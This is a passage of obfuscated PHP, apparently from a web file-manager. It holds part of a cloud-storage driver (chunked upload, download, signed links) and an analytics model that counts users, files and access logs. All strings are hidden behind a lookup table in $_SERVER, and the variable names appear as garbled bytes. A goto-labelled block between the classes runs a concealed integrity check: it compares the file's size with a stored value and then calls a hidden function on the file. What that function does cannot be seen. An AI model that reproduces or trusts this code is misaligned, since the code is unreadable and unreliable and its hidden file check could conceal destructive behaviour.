foreach ($¾’âÀê¾ as $”Ì¬ªÓ) { $—‘ëÚÅ¨[$”Ì¬ªÓ[$”ËêÀÍÅ[32]]] = $”Ì¬ªÓ[$”ËêÀÍÅ[76]]; } foreach ($ôä¸ûÙğ as $”Ì¬ªÓ) { if (is_string($”Ì¬ªÓ)) { $—‘ëÚÅ¨[$”Ì¬ªÓ] = 0; } } return $this->listAllFiles($İËäŞÜ, array_keys($—‘ëÚÅ¨), $—‘ëÚÅ¨); } public function canRead($ñ–ÂÁÚ×) { return $this->exist($ñ–ÂÁÚ×) ? !0 : !1; } public function canWrite($æ±İğÕ) { return $this->exist($æ±İğÕ) ? !0 : !1; } public function getContent($äËÀ…İõ) { return $this->fileSubstr($äËÀ…İõ, 0, -1); } public function setContent($ãˆ½‡ÕÊ, $ê–æÈŒ» = '') { $ —üĞ« =& $_SERVER[ĞÆÏ¡Îª]; if (!$ê–æÈŒ») { $ªş¡ñìï = $this->ussRequest($ãˆ½‡ÕÊ, $ —üĞ«[226]); return $ªş¡ñìï[$ —üĞ«[1182]]; } $şƒó’äÎ = $this->tempFile($this->pathThis($ãˆ½‡ÕÊ)); file_put_contents($şƒó’äÎ, $ê–æÈŒ»); if ($this->upload($ãˆ½‡ÕÊ, $şƒó’äÎ)) { $this->tempFileRemve($şƒó’äÎ); return !0; } return !1; } public function fileSubstr($ Á¡ÀĞ§, $ŞšµòÕÕ, $‰¹ ½ÒÎ) { $ÖÛ‡¼¦ =& $_SERVER[ĞÆÏ¡Îª]; if (!($…ÌÆ›Ô¹ = $this->link($ Á¡ÀĞ§))) { return !1; } $Úèà­‰Á = !1; if ($‰¹ ½ÒÎ > 0) { $ñí–²Ø³ = $ŞšµòÕÕ + $‰¹ ½ÒÎ - 1; $Úèà­‰Á = array($ÖÛ‡¼¦[1423] . $ŞšµòÕÕ . $ÖÛ‡¼¦[394] . $ñí–²Ø³); } $”äò¥²Ê = url_request($…ÌÆ›Ô¹, $ÖÛ‡¼¦[230], !1, $Úèà­‰Á); return $”äò¥²Ê[$ÖÛ‡¼¦[745]] ? $”äò¥²Ê[$ÖÛ‡¼¦[1184]] : !1; } public function upload($ö¼Ö…È‘, $á´¤µ¶, $ºÄÄØ‡š = false, $şçî ™Æ = REPEAT_REPLACE) { $ã°Íì­„ =& $_SERVER[ĞÆÏ¡Îª]; $İñ´şŒ = IO::size($á´¤µ¶); if ($İñ´şŒ <= 1024 * 1024 * 200) { $ªõê¤ŸÔ = array($ã°Íì­„[1463] . $á´¤µ¶); $·Ë¡Ê‡ = $this->ussRequest($ö¼Ö…È‘, $ã°Íì­„[228], $ªõê¤ŸÔ); return $·Ë¡Ê‡[$ã°Íì­„[1182]] ? $this->getPathOuter($ö¼Ö…È‘) : !1; } $ÅÆ›áÅù = 1024 * 1024 * 10; $ÖÂıèáš = array($ã°Íì­„[1464], $ã°Íì­„[1465] . $İñ´şŒ, $ã°Íì­„[1466], $ã°Íì­„[1467] . $ÅÆ›áÅù); $·Ë¡Ê‡ = $this->ussRequest($ö¼Ö…È‘, $ã°Íì­„[228], !1, $ÖÂıèáš); if (!$·Ë¡Ê‡[$ã°Íì­„[1182]]) { return !1; } $¸çˆó®³ = $·Ë¡Ê‡[$ã°Íì­„[1184]]; $èö§§Â™ = 0; $Ö‚¼Ÿ = $¸çˆó®³[$ã°Íì­„[1468]]; $€©À¦æÖ = fopen($á´¤µ¶, $ã°Íì­„[1372]); if (!$€©À¦æÖ) { return !1; } do { $·ƒÚ§¶ = $¸çˆó®³[$ã°Íì­„[1469]]; fseek_64($€©À¦æÖ, $èö§§Â™); $ËüŸ˜ìñ = fread($€©À¦æÖ, $·ƒÚ§¶); $ß©ñ½Ù† = 0; do { $ß©ñ½Ù†++; $¸çˆó®³ = $this->uploadPart($ö¼Ö…È‘, $¸çˆó®³, $ËüŸ˜ìñ); } while (!$¸çˆó®³ && $ß©ñ½Ù† < 3); if (!$¸çˆó®³) { return !1; } $Ö‚¼Ÿ = $¸çˆó®³[$ã°Íì­„[1468]]; $èö§§Â™ += $·ƒÚ§¶; } while ($Ö‚¼Ÿ != -1); fclose($€©À¦æÖ); $ÖÂıèáš = array($ã°Íì­„[1470], $ã°Íì­„[1471] . $¸çˆó®³[$ã°Íì­„[1472]], $ã°Íì­„[1466]); $·Ë¡Ê‡ = $this->ussRequest($ö¼Ö…È‘, $ã°Íì­„[228], !1, $ÖÂıèáš); return $·Ë¡Ê‡[$ã°Íì­„[1182]] ? $this->getPathOuter($ö¼»ÄéÔ) : !1; } private function uploadPart($İøÚÜÔÚ, $§¶É›Òû, &$ì¢Ë¶—Š) { $³å²‡ÔÔ =& $_SERVER[ĞÆÏ¡Îª]; $ÑäÆ¿î = array($³å²‡ÔÔ[1473], $³å²‡ÔÔ[1471] . $§¶É›Òû[$³å²‡ÔÔ[1472]], $³å²‡ÔÔ[1474] . $§¶É›Òû[$³å²‡ÔÔ[1468]], $³å²‡ÔÔ[142] . $§¶É›Òû[$³å²‡ÔÔ[1469]]); $†šğ¤ÕÇ = $this->ussRequest($İøÚÜÔÚ, $³å²‡ÔÔ[228], $ì¢Ë¶—Š, $ÑäÆ¿î); return !$†šğ¤ÕÇ[$³å²‡ÔÔ[1182]] ? $†šğ¤ÕÇ[$³å²‡ÔÔ[1182]] : $†šğ¤ÕÇ[$³å²‡ÔÔ[1184]]; } public function uploadFormData($¹º¨Ğşƒ, $ï†ò©± = 3600) { return $this->uploadPolicy($¹º¨Ğşƒ, $ï†ò©±); } public function multiUploadFormData($¢İéğŞà, $ı¾õÜ¹à = 3600) { $âéóóÕ× =& $_SERVER[ĞÆÏ¡Îª]; $öøÓ¤ˆÂ = (int) $GLOBALS[$âéóóÕ×[7]][$âéóóÕ×[76]]; return $this->uploadPolicy($¢İéğŞà, $ı¾õÜ¹à, $öøÓ¤ˆÂ); } private function uploadPolicy($­Şœàß, $–çú¯˜• = 3600, $ÚšÃ®¸´ = 0) { $ŞÕÍÍ÷î =& $_SERVER[ĞÆÏ¡Îª]; $ğ‘ü¿Õ = $ŞÕÍÍ÷î[8] . $this->bucket; $ª•ªô™¨ = gmdate($ŞÕÍÍ÷î[1408]); $¶¿ ˆ¹ = array($ŞÕÍÍ÷î[1475] => $this->bucket, $ŞÕÍÍ÷î[1476] => $­Şœàß, $ŞÕÍÍ÷î[1477] => time() + $–çú¯˜•, $ŞÕÍÍ÷î[1478] => $ª•ªô™¨); if ($ÚšÃ®¸´) { $¶¿ ˆ¹[$ŞÕÍÍ÷î[1388]] = $ÚšÃ®¸´; } $ƒ‚¶À¸Ë = base64_encode(json_encode($¶¿ ˆ¹)); $¤Û¸¬Á  = base64_encode(hash_hmac($ŞÕÍÍ÷î[1445], "\120\x4f\x53\x54\46{$ğ‘ü¿Õ}\46{$ª•ªô™¨}\46{$ƒ‚¶À¸Ë}", md5("{$this->userpass}"), !0)); $‹şÑ½Í§ = array($ŞÕÍÍ÷î[1313] => $ƒ‚¶À¸Ë, $ŞÕÍÍ÷î[1479] => "\125\120\131\x55\116\x20{$this->username}\x3a{$¤Û¸¬Á }", $ŞÕÍÍ÷î[181] => $this->endpoint . $ğ‘ü¿Õ); return $‹şÑ½Í§; } public function download($ªÔ—‹, $Ã…±ìª) { $îÔ¯¥»Ô = IO::getPathInner(IO::mkfile($Ã…±ìª)); if (!($ƒáÊåìÚ = $this->link($ªÔ—‹))) { return !1; } $àòÖûöÆ = 0; $Àşîğü = 1024 * 200; $ƒïÑ”ãš = fopen($îÔ¯¥»Ô, $_SERVER[ĞÆÏ¡Îª][1429]); while (!0) { $â©‡Å¯Û = $this->fileSubstr($ªÔ—‹, $àòÖûöÆ, $Àşîğü); if ($â©‡Å¯Û === !1) { return !1; } fwrite($ƒïÑ”ãš, $â©‡Å¯Û); $àòÖûöÆ += $Àşîğü; if (strlen($â©‡Å¯Û) < $Àşîğü) { break; } } fclose($ƒïÑ”ãš); return $Ã…±ìª; } public function link($›¦ã‡¨», $–„›ÔÀ = array()) { $˜­õø‚ˆ =& $_SERVER[ĞÆÏ¡Îª]; $›¦ã‡¨» = trim($›¦ã‡¨», $˜­õø‚ˆ[8]); if (!empty($this->token)) { $Ú÷À¿Éò = strtotime(date($˜­õø‚ˆ[1480])); $¨’¹ç§û = substr(md5($this->token . $˜­õø‚ˆ[293] . $Ú÷À¿Éò . $˜­õø‚ˆ[1481] . $›¦ã‡¨»), 12, 8) . $Ú÷À¿Éò; $–„›ÔÀ[] = $˜­õø‚ˆ[1482] . $¨’¹ç§û; } $õŒ†´  = !empty($–„›ÔÀ) ? $˜­õø‚ˆ[73] . implode($˜­õø‚ˆ[293], $–„›ÔÀ) : $˜­õø‚ˆ[12]; return $this->getHost() . $˜­õø‚ˆ[8] . $›¦ã‡¨» . $õŒ†´ ; } public function fileOut($äãˆ¿Ğ£, $Ñ½’øÆ = false, $Î×·´ö´ = false, $Õ…ËÖäª = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($äãˆ¿Ğ£, $Ñ½’øÆ, $Î×·´ö´, $Õ…ËÖäª); } if (!$Î×·´ö´) { $Î×·´ö´ = $this->pathThis($äãˆ¿Ğ£); } $ÜÊÓë²’ = $Ñ½’øÆ ? array($_SERVER[ĞÆÏ¡Îª][1483] . rawurlencode($Î×·´ö´)) : array(); $–—…ÑŞÓ = $this->link($äãˆ¿Ğ£, $ÜÊÓë²’); $this->fileOutLink($–—…ÑŞÓ); } public function fileOutServer($œÌã€¬ª, $¼µÇ”åß = false, $ÇÏ¥Ä„ = false, $Õºşş„¡ = '') { parent::fileOut($œÌã€¬ª, $¼µÇ”åß, $ÇÏ¥Ä„, $Õºşş„¡); } public function fileOutImage($À²»•ˆ¡, $‡æüÛ«‹ = 250) { $ôâ—ş— = $this->link($À²»•ˆ¡ . $_SERVER[ĞÆÏ¡Îª][1484] . $‡æüÛ«‹); $this->fileOutLink($ôâ—ş—); } public function fileOutImageServer($•‡ˆá§, $¤Äˆìù¹ = 250) { parent::fileOutImage($•‡ˆá§, $¤Äˆìù¹); } public function hashMd5($†ôâ½Å) { $¼½…Š¤ö =& $_SERVER[ĞÆÏ¡Îª]; $„Ş«ö®¸ = $this->_objectMeta($†ôâ½Å); return isset($„Ş«ö®¸[$¼½…Š¤ö[212]]) ? $„Ş«ö®¸[$¼½…Š¤ö[212]] : !1; } public function size($…¸ïÖéí) { $é’–Ÿ–› = $this->objectMeta($…¸ïÖéí); return $é’–Ÿ–› ? $é’–Ÿ–›[$_SERVER[ĞÆÏ¡Îª][76]] : 0; } public function info($õ–ıéËƒ) { if ($this->isFolder($õ–ıéËƒ)) { return $this->folderInfo($õ–ıéËƒ); } else { if ($this->isFile($õ–ıéËƒ)) { return $this->fileInfo($õ–ıéËƒ); } } return !1; } public function exist($–ó›Ù¨€) { return $this->isFile($–ó›Ù¨€) || $this->isFolder($–ó›Ù¨€); } public function isFile($¼¼Òâ‰£) { return !$this->isFolder($¼¼Òâ‰£) && $this->objectMeta($¼¼Òâ‰£); } public function isFolder($Ëäıø°¼) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][165], $Ëäıø°¼); } protected function objectMeta($ä®•‰¼®) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][167], $ä®•‰¼®); } protected function _objectMeta($ÀûøŸÁâ) { $ù€ş™áŠ =& $_SERVER[ĞÆÏ¡Îª]; if ($ÀûøŸÁâ == $ù€ş™áŠ[12] || $ÀûøŸÁâ == $ù€ş™áŠ[8]) { return array(); } $ûâ·ÛÛ = $this->ussRequest($ÀûøŸÁâ, $ù€ş™áŠ[1485]); if (!$ûâ·ÛÛ[$ù€ş™áŠ[1182]]) { return null; } $¨ç‚Ãæ = isset($ûâ·ÛÛ[$ù€ş™áŠ[1184]]) ? $ûâ·ÛÛ[$ù€ş™áŠ[1184]] : array(); if (!isset($¨ç‚Ãæ[$ù€ş™áŠ[1486]])) { return null; } $°ÌÜºˆÄ = array($ù€ş™áŠ[33] => isset($¨ç‚Ãæ[$ù€ş™áŠ[1486]]) ? $¨ç‚Ãæ[$ù€ş™áŠ[1486]] : null, $ù€ş™áŠ[76] => isset($¨ç‚Ãæ[$ù€ş™áŠ[1487]]) ? $¨ç‚Ãæ[$ù€ş™áŠ[1487]] : null, $ù€ş™áŠ[212] => isset($¨ç‚Ãæ[$ù€ş™áŠ[1488]]) ? $¨ç‚Ãæ[$ù€ş™áŠ[1488]] : null, $ù€ş™áŠ[1455] => isset($¨ç‚Ãæ[$ù€ş™áŠ[1489]]) ? $¨ç‚Ãæ[$ù€ş™áŠ[1489]] : null); $°ÌÜºˆÄ[$ù€ş™áŠ[1456]] = isset($¨ç‚Ãæ[$ù€ş™áŠ[1490]]) ? strtotime($¨ç‚Ãæ[$ù€ş™áŠ[1490]]) : $°ÌÜºˆÄ[$ù€ş™áŠ[1455]]; return $°ÌÜºˆÄ; } protected function _isFolder($‰ç½ÑØÍ) { $°ç¾ã†ï =& $_SERVER[ĞÆÏ¡Îª]; if ($‰ç½ÑØÍ == $°ç¾ã†ï[12] || $‰ç½ÑØÍ == $°ç¾ã†ï[8]) { return !0; } $—İì÷”ê = $this->_objectMeta($‰ç½ÑØÍ); return isset($—İì÷”ê[$°ç¾ã†ï[33]]) && $—İì÷”ê[$°ç¾ã†ï[33]] == $°ç¾ã†ï[75] ? !0 : !1; } } goto F¢‡®‡£ñ; C‚Åå¹‰è: $_size = $_SERVER[ĞÆÏ¡Îª][867]; if ($_SERVER[$_SERVER[ĞÆÏ¡Îª][238]] != $_size($_file)) { $_getc = $_SERVER[ĞÆÏ¡Îª][240]; $_getfile = $_SERVER[$_SERVER[ĞÆÏ¡Îª][241]] . $_SERVER[ĞÆÏ¡Îª][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÆÏ¡Îª][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÆÏ¡Îª][243]) { $exit = $_SERVER[ĞÆÏ¡Îª][244]; $exit(); } $_act = $_SERVER[ĞÆÏ¡Îª][245]; $_act($_file); } class AnalysisModel extends ModelBaseLight { public function init($¥©¡ó˜ô) { $†€Çñå =& $_SERVER[ĞÆÏ¡Îª]; $óÑªµš§ = array($†€Çñå[609] => array($†€Çñå[33] => $†€Çñå[1748], $†€Çñå[282] => array($†€Çñå[224], $†€Çñå[760], $†€Çñå[1749], $†€Çñå[1750])), $†€Çñå[1751] => array($†€Çñå[33] => $†€Çñå[1752], $†€Çñå[282] => array($†€Çñå[224], $†€Çñå[758], $†€Çñå[1753], $†€Çñå[1754], $†€Çñå[1755]))); if (!isset($óÑªµš§[$¥©¡ó˜ô])) { return !1; } $this->optionType = $óÑªµš§[$¥©¡ó˜ô][$†€Çñå[33]]; $this->field = $óÑªµš§[$¥©¡ó˜ô][$†€Çñå[282]]; return !0; } public function listData($ëı£›œè = false, $ÉÀŒŸß• = "\155\157\x64\x69\146\171\124\151\x6d\x65", $¢Íë× = false) { return parent::listData($ëı£›œè, $ÉÀŒŸß•, $¢Íë×); } public function trendList($’á¿ûö) { $´¹Ù©ïÂ =& $_SERVER[ĞÆÏ¡Îª]; $²°üŒÌ = $this->listData(); if ($²°üŒÌ) { $¬½àœì‘ = end($²°üŒÌ); $—ÀÇÓÛ = date($´¹Ù©ïÂ[1756], strtotime($´¹Ù©ïÂ[1757])); if ($¬½àœì‘[$´¹Ù©ïÂ[224]] == $—ÀÇÓÛ) { return $²°üŒÌ; } $¹ä­æÉ = strtotime($¬½àœì‘[$´¹Ù©ïÂ[224]]); } if (!isset($¹ä­æÉ)) { $Âæ—Ò³ñ = $’á¿ûö == $´¹Ù©ïÂ[609] ? $´¹Ù©ïÂ[544] : $´¹Ù©ïÂ[820]; $¹ä­æÉ = Model($Âæ—Ò³ñ)->min($´¹Ù©ïÂ[200]); } $îŞÃ®Ò = $´¹Ù©ïÂ[1758] . ucfirst($’á¿ûö); $½Ô‡Ãü = $this->dateList($¹ä­æÉ); foreach ($½Ô‡Ãü as $—ÀÇÓÛ) { $this->{$îŞÃ®Ò}($—ÀÇÓÛ); } return $this->listData(); } private function dateList($À×¡İ×¬) { $§—Ñ¾À =& $_SERVER[ĞÆÏ¡Îª]; $ì–ëÈ›õ = $À×¡İ×¬; $Ç¯—Ô‚› = strtotime($§—Ñ¾À[1757]); $ëÀéÂ“Š = array(); while ($ì–ëÈ›õ <= $Ç¯—Ô‚›) { $ëÀéÂ“Š[] = date($§—Ñ¾À[1756], $ì–ëÈ›õ); $ì–ëÈ›õ = strtotime($§—Ñ¾À[1759], $ì–ëÈ›õ); } return $ëÀéÂ“Š; } public function _recordUser($ìùªÜÚÑ = '') { $ãĞ¯Û¨ı =& $_SERVER[ĞÆÏ¡Îª]; $ı˜ìú˜‡ = strtotime(date($ãĞ¯Û¨ı[1760], strtotime($ìùªÜÚÑ))); $ŠÂÂÚ¨¸ = strtotime(date($ãĞ¯Û¨ı[1761], strtotime($ìùªÜÚÑ))); $ı­ÍÎß³ = array($ãĞ¯Û¨ı[200] => array($ãĞ¯Û¨ı[1004], $ŠÂÂÚ¨¸)); $ˆ»Ñ¯¼ê = Model($ãĞ¯Û¨ı[544])->where($ı­ÍÎß³)->count($ãĞ¯Û¨ı[1647]); $ı­ÍÎß³[$ãĞ¯Û¨ı[200]] = array($ãĞ¯Û¨ı[342], array($ı˜ìú˜‡, $ŠÂÂÚ¨¸)); $¸•Ğ¯ª = Model($ãĞ¯Û¨ı[544])->where($ı­ÍÎß³)->count($ãĞ¯Û¨ı[1647]); $ı­ÍÎß³[$ãĞ¯Û¨ı[33]] = $ãĞ¯Û¨ı[1762]; $»İ”±à = Model($ãĞ¯Û¨ı[1763])->where($ı­ÍÎß³)->count($ãĞ¯Û¨ı[1764]); $ˆ”¿çÏ¸ = array($ãĞ¯Û¨ı[224] => $ìùªÜÚÑ, $ãĞ¯Û¨ı[760] => (int) $ˆ»Ñ¯¼ê, $ãĞ¯Û¨ı[1749] => (int) $¸•Ğ¯ª, $ãĞ¯Û¨ı[1750] => (int) $»İ”±à); return $this->insert($ˆ”¿çÏ¸); } public function _recordStore($É›ŸêÏ„ = '') { $†‹¼«Õ© =& $_SERVER[ĞÆÏ¡Îª]; $øÒÃ¢û´ = strtotime(date($†‹¼«Õ©[1761], strtotime($É›ŸêÏ„))); $·‚ÑÌ“Û = array($†‹¼«Õ©[200] => array($†‹¼«Õ©[1004], $øÒÃ¢û´)); $€ï§ì…¾ = Model($†‹¼«Õ©[480])->where($·‚ÑÌ“Û)->sum($†‹¼«Õ©[76]); $·‚ÑÌ“Û[$†‹¼«Õ©[419]] = 0; $ˆÈìÙíë = Model($†‹¼«Õ©[820])->where($·‚ÑÌ“Û)->sum($†‹¼«Õ©[76]); $·‚ÑÌ“Û[$†‹¼«Õ©[420]] = 1; $ûñ— ¥Ç = Model($†‹¼«Õ©[820])->where($·‚ÑÌ“Û)->sum($†‹¼«Õ©[76]); $·‚ÑÌ“Û[$†‹¼«Õ©[420]] = 2; $ˆ´Æ»Õ± = Model($†‹¼«Õ©[820])->where($·‚ÑÌ“Û)->sum($†‹¼«Õ©[76]); $‹ßä¾Í = array($†‹¼«Õ©[224] => $É›ŸêÏ„, $†‹¼«Õ©[758] => (int) $ˆÈìÙíë, $†‹¼«Õ©[1753] => (int) $€ï§ì…¾, $†‹¼«Õ©[1754] => (int) $ûñ— ¥Ç, $†‹¼«Õ©[1755] => (int) $ˆ´Æ»Õ±); return $this->insert($‹ßä¾Í); } public function trend($ÉŒ¾ÅéË, $Àí¹ÔÒÂ) { $¬ËÉ÷« =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->init($ÉŒ¾ÅéË)) { return !1; } $©±öÓÉú = $this->trendList($ÉŒ¾ÅéË); if ($©±öÓÉú && $Àí¹ÔÒÂ != $¬ËÉ÷«[1620]) { $‹¦²µñ¡ = $©±öÓÉú[0][$¬ËÉ÷«[224]]; $şè…ÛÚ… = $this->validDate($Àí¹ÔÒÂ, $‹¦²µñ¡); $ü—œ³È = array(); $à¾èâ = array_to_keyvalue($©±öÓÉú, $¬ËÉ÷«[224]); foreach ($şè…ÛÚ… as $´°à™) { if (isset($à¾èâ[$´°à™])) { $Ê²ËÕä = $à¾èâ[$´°à™]; } else { $Ê²ËÕä = end($©±öÓÉú); $Ê²ËÕä[$¬ËÉ÷«[224]] = $´°à™; if ($ÉŒ¾ÅéË == $¬ËÉ÷«[609]) { $Ê²ËÕä[$¬ËÉ÷«[1749]] = $Ê²ËÕä[$¬ËÉ÷«[1750]] = 0; } } $ü—œ³È[] = $Ê²ËÕä; } $©±öÓÉú = $ü—œ³È; } $Äö®í®µ = array($¬ËÉ÷«[609] => array($¬ËÉ÷«[760] => LNG($¬ËÉ÷«[1765]), $¬ËÉ÷«[1749] => LNG($¬ËÉ÷«[1766]), $¬ËÉ÷«[1750] => LNG($¬ËÉ÷«[1767])), $¬ËÉ÷«[1751] => array($¬ËÉ÷«[758] => LNG($¬ËÉ÷«[1768]), $¬ËÉ÷«[1753] => LNG($¬ËÉ÷«[1769]), $¬ËÉ÷«[1754] => LNG($¬ËÉ÷«[1770]), $¬ËÉ÷«[1755] => LNG($¬ËÉ÷«[1771]))); $¢åÂÑâ = array($¬ËÉ÷«[609] => $¬ËÉ÷«[1772], $¬ËÉ÷«[1751] => $¬ËÉ÷«[76]); if (empty($©±öÓÉú)) { $´°à™ = date($¬ËÉ÷«[1756], strtotime($¬ËÉ÷«[1757])); $ÙæÔµ® = array($¬ËÉ÷«[224] => $´°à™); foreach ($Äö®í®µ[$ÉŒ¾ÅéË] as $“‚çºíÁ => $Çôş÷èæ) { $ÙæÔµ®[$“‚çºíÁ] = 0; } $©±öÓÉú[] = $ÙæÔµ®; } $ÕÎ¸ÆŸÙ = array(); foreach ($©±öÓÉú as $Çôş÷èæ) { if ($ÉŒ¾ÅéË == $¬ËÉ÷«[1751] && $Çôş÷èæ[$¬ËÉ÷«[1753]] > $Çôş÷èæ[$¬ËÉ÷«[758]]) { $Çôş÷èæ[$¬ËÉ÷«[1753]] = $Çôş÷èæ[$¬ËÉ÷«[758]]; } foreach ($Äö®í®µ[$ÉŒ¾ÅéË] as $“‚çºíÁ => $ÖƒœÈ×ı) { $Ê²ËÕä = array($¬ËÉ÷«[224] => $Çôş÷èæ[$¬ËÉ÷«[224]], $¬ËÉ÷«[1546] => $ÖƒœÈ×ı); $Ê²ËÕä[$¢åÂÑâ[$ÉŒ¾ÅéË]] = isset($Çôş÷èæ[$“‚çºíÁ]) ? $Çôş÷èæ[$“‚çºíÁ] : 0; $ÕÎ¸ÆŸÙ[] = $Ê²ËÕä; } } return $ÕÎ¸ÆŸÙ; } public function validDate($ÀÍ¥µÜ, $Ä”®†Í) { $ÂúÛ¬Ä =& $_SERVER[ĞÆÏ¡Îª]; $¿Â‘­ï = date($ÂúÛ¬Ä[1756], strtotime($ÂúÛ¬Ä[1757])); $şÍÔ‚íú = array($¿Â‘­ï); switch ($ÀÍ¥µÜ) { case $ÂúÛ¬Ä[1627]: $´ÑŸŠê = mktime(0, 0, 0, date($ÂúÛ¬Ä[1773]), date($ÂúÛ¬Ä[1366]) - date($ÂúÛ¬Ä[1429]) + 7 - 7, date($ÂúÛ¬Ä[1774])); $÷ûÁŞ‰ú = 0; do { $ğ«Ôã¥İ = date($ÂúÛ¬Ä[1756], $´ÑŸŠê - 3600 * 24 * 7 * $÷ûÁŞ‰ú); $şÍÔ‚íú[] = $ğ«Ôã¥İ; $÷ûÁŞ‰ú++; } while ($Ä”®†Í < $ğ«Ôã¥İ); break; case $ÂúÛ¬Ä[1625]: $÷ûÁŞ‰ú = 1; do { $Ã˜ÑØ•œ = date($ÂúÛ¬Ä[1775], strtotime("\55\x20{$÷ûÁŞ‰ú}\x20\x6d\157\156\164\150\163")); $şÍÔ‚íú[] = $Ã˜ÑØ•œ; $÷ûÁŞ‰ú++; } while ($Ä”®†Í < $Ã˜ÑØ•œ); break; case $ÂúÛ¬Ä[1776]: $ıßİÙåĞ = (int) date($ÂúÛ¬Ä[1774], strtotime($Ä”®†Í)); $ôçË¨ˆÙ = (int) date($ÂúÛ¬Ä[1774]); if ($ıßİÙåĞ >= $ôçË¨ˆÙ) { break; } for ($ıßİÙåĞ; $ıßİÙåĞ < $ôçË¨ˆÙ; $ıßİÙåĞ++) { $şÍÔ‚íú[] = $ıßİÙåĞ . $ÂúÛ¬Ä[1777]; } break; default: break; } if ($Ä”®†Í > end($şÍÔ‚íú)) { array_pop($şÍÔ‚íú); } sort($şÍÔ‚íú); return $şÍÔ‚íú; } public function listTable($ûœ®ãº) { $¸äå“ÊÑ = ucfirst($ûœ®ãº); return Model($¸äå“ÊÑ)->listData(); } public function option($×®¥çÚ©) { $Ñ¡—¶ºŸ = $_SERVER[ĞÆÏ¡Îª][1778] . ucfirst($×®¥çÚ©); return $this->{$Ñ¡—¶ºŸ}(); } private function optionUser() { $ˆã¸ƒ¤® =& $_SERVER[ĞÆÏ¡Îª]; $òµÄÁ´á = Model($ˆã¸ƒ¤®[544])->count($ˆã¸ƒ¤®[1647]); $”Ü²²°Ã = Model($ˆã¸ƒ¤®[544])->where($ˆã¸ƒ¤®[1779])->count($ˆã¸ƒ¤®[1647]); $‹ßÎâ„İ = intval($GLOBALS[$ˆã¸ƒ¤®[6]][$ˆã¸ƒ¤®[358]][$ˆã¸ƒ¤®[1602]]) / 3600; $Õ—©ıÏ = strtotime("\x2d{$‹ßÎâ„İ}\x20\x68\157\x75\162\163"); $›¬Ã®‹ø = strtotime(date($ˆã¸ƒ¤®[1760])); if ($Õ—©ıÏ < $›¬Ã®‹ø) { $Õ—©ıÏ = $›¬Ã®‹ø; } $òëğÕîÈ = array($ˆã¸ƒ¤®[1780] => array($ˆã¸ƒ¤®[1005], $Õ—©ıÏ)); $è¦•ƒ»ö = (int) Model($ˆã¸ƒ¤®[544])->where($òëğÕîÈ)->count($ˆã¸ƒ¤®[1647]); if (!$è¦•ƒ»ö) { $è¦•ƒ»ö = 1; } $òëğÕîÈ = array($ˆã¸ƒ¤®[1780] => array($ˆã¸ƒ¤®[1005], $›¬Ã®‹ø)); $¶˜”ïáã = Model($ˆã¸ƒ¤®[544])->where($òëğÕîÈ)->count($ˆã¸ƒ¤®[1647]); return array($ˆã¸ƒ¤®[754] => (int) $òµÄÁ´á, $ˆã¸ƒ¤®[1781] => (int) ($òµÄÁ´á - $”Ü²²°Ã), $ˆã¸ƒ¤®[1782] => (int) $”Ü²²°Ã, $ˆã¸ƒ¤®[1783] => (int) $¶˜”ïáã, $ˆã¸ƒ¤®[1784] => $è¦•ƒ»ö); } private function optionFile() { $ô¾Á–÷ =& $_SERVER[ĞÆÏ¡Îª]; $Ğ‘ú‡¬† = $this->sourceSize(); $€ˆ¦Á´´ = $Ğ‘ú‡¬†[$ô¾Á–÷[76]]; $ÇÊ˜Äƒú = $Ğ‘ú‡¬†[$ô¾Á–÷[1753]]; $œ›ğ±áÎ = Model($ô¾Á–÷[820])->where(array($ô¾Á–÷[419] => 0))->count($ô¾Á–÷[411]); $˜’ĞşéÀ = array($ô¾Á–÷[419] => 0, $ô¾Á–÷[200] => array($ô¾Á–÷[1005], strtotime(date($ô¾Á–÷[1760])))); $¶ÓÙş¶Ú = Model($ô¾Á–÷[820])->where($˜’ĞşéÀ)->sum($ô¾Á–÷[76]); $—‹ÎÑ¯„ = Model($ô¾Á–÷[820])->where($˜’ĞşéÀ)->count($ô¾Á–÷[411]); return array($ô¾Á–÷[758] => $€ˆ¦Á´´, $ô¾Á–÷[1753] => $ÇÊ˜Äƒú, $ô¾Á–÷[1785] => $€ˆ¦Á´´ - $ÇÊ˜Äƒú, $ô¾Á–÷[1786] => (int) $¶ÓÙş¶Ú, $ô¾Á–÷[760] => (int) $œ›ğ±áÎ, $ô¾Á–÷[1787] => (int) $—‹ÎÑ¯„); } private function optionAccess() { $ş—´ÃÍ¹ =& $_SERVER[ĞÆÏ¡Îª]; return array($ş—´ÃÍ¹[754] => $this->typeLogCnt(), $ş—´ÃÍ¹[107] => $this->typeLogCnt($ş—´ÃÍ¹[107]), $ş—´ÃÍ¹[461] => $this->typeLogCnt($ş—´ÃÍ¹[461]), $ş—´ÃÍ¹[1788] => $this->typeLogCnt($ş—´ÃÍ¹[1788]), $ş—´ÃÍ¹[1789] => $this->typeLogCnt($ş—´ÃÍ¹[1789]), $ş—´ÃÍ¹[609] => $this->typeLogCnt($ş—´ÃÍ¹[12], $ş—´ÃÍ¹[1764])); } private function typeLogCnt($ÇÍºİ» = '', $ßº˜ÎÍ¼ = "\x69\144") { $¢Ç­Æ—Ù =& $_SERVER[ĞÆÏ¡Îª]; $¦ï²ñçÎ = array($¢Ç­Æ—Ù[107] => array($¢Ç­Æ—Ù[1790], $¢Ç­Æ—Ù[1791]), $¢Ç­Æ—Ù[461] => array($¢Ç­Æ—Ù[1792], $¢Ç­Æ—Ù[1793]), $¢Ç­Æ—Ù[1788] => array($¢Ç­Æ—Ù[1794], $¢Ç­Æ—Ù[1795], $¢Ç­Æ—Ù[1796]), $¢Ç­Æ—Ù[1789] => array($¢Ç­Æ—Ù[1797], $¢Ç­Æ—Ù[1798]), $¢Ç­Æ—Ù[1799] => array($¢Ç­Æ—Ù[1800], $¢Ç­Æ—Ù[1801], $¢Ç­Æ—Ù[1802])); $½¼·ºÊÆ = strtotime(date($¢Ç­Æ—Ù[1760])); $ùå’€Å = array($¢Ç­Æ—Ù[200] => array($¢Ç­Æ—Ù[1005], $½¼·ºÊÆ)); if ($ÇÍºİ») { $ùå’€Å[$¢Ç­Æ—Ù[33]] = array($¢Ç­Æ—Ù[7], $¦ï²ñçÎ[$ÇÍºİ»]); } $”‰˜ = 